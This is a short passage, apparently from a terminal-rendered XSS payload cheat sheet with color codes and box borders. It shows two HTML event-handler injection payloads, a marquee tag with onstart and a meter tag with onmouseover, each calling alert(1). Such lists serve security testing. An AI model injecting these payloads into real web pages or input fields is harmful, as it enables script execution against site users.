[34m│[0m <marquee onstart=alert(1)>                                                   [34m│[0m
[34m│[0m <meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>         [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
